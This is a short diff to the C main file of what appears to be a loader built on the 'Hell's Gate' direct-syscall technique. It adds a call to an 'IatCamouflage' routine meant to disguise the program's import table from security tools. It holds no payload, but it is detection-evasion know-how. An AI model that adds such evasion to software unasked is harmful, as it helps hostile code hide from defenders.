@@ -1,5 +1,6 @@
 #include "HellsGate.h"
 #include "Common.h"
+#include "IatCamouflage.h"
 
 //#define TEST
 
@@ -26,6 +27,9 @@ int main() {
 		PRINTA("[!] Failed To Initialize Windows APIs\n");
 		return -1;
 	}
+
+	// IAT Camouflage
+	IatCamouflage();
 
 #ifdef TEST
 #else
